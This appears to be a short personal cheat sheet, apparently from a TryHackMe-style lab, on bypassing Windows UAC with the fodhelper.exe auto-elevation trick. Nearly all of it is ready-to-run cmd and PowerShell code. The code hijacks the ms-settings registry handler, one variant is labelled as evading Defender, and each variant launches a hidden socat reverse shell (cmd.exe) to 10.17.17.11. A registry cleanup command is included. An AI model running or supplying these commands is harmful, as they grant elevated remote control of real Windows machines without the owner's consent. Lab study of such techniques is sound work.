# terminal
fodhelper:
----------

You can use the following commands to set the required registry keys from a standard command line:

```text-plain
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.17.17.11:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

to clean the reg keys, use:

```text-plain
reg delete HKCU\Software\Classes\ms-settings\ /f
```

fodhelper powershell defender detected:
---------------------------------------

```text-plain
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.17.17.11:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

CMD
---

```text-plain
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.17.17.11:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
	
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

fodhelper.exe
```